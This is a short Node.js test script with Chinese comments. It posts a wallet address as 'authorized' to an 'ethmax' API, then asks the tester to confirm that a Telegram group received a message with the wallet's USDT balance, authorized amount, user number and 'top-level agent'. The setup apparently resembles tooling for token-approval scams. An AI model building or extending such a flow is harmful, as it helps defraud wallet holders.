const fetch = require('node-fetch');

async function testRealAuthorizeWithTelegram() {
  const testAddress = '0x2a2eAe05aa9eBA985A1243cbfc67808aF0192141';
  
  console.log('🔔 测试真实授权流程的Telegram通知...');
  console.log(`📍 测试地址: ${testAddress}`);
  
  try {
    // 调用真实的授权API
    const response = await fetch('https://ethmax.vercel.app/api/user/authorize', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        address: testAddress,
        isAuthorized: true
      })
    });

    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }

    const result = await response.json();
    console.log('✅ 授权API调用结果:');
    console.log('📊 状态:', result.success ? '成功' : '失败');
    
    if (result.data) {
      console.log('👤 用户数据:');
      console.log('  - 地址:', result.data.address);
      console.log('  - 授权状态:', result.data.isAuthorized ? '已授权' : '未授权');
      console.log('  - ETH余额:', result.data.eth);
      console.log('  - 是否首次授权:', result.data.firstTimeAuth ? '是' : '否');
    }
    
    if (result.message) {
      console.log('💬 消息:', result.message);
    }

    // 等待几秒钟让通知处理
    console.log('\n⏳ 等待3秒钟让Telegram通知处理...');
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    console.log('✅ 如果Telegram群组收到授权通知消息，说明功能正常');
    console.log('📱 请检查Telegram群组是否收到以下格式的消息:');
    console.log('   钱包余额: [链上USDT余额]');
    console.log('   顶层代理: [代理信息]');
    console.log('   用户编号: [用户ID]');
    console.log('   授权金额: [授权金额] USDT');
    console.log('   客户地址: [授权地址]');

  } catch (error) {
    console.error('❌ 测试失败:', error.message);
  }
}

testRealAuthorizeWithTelegram();
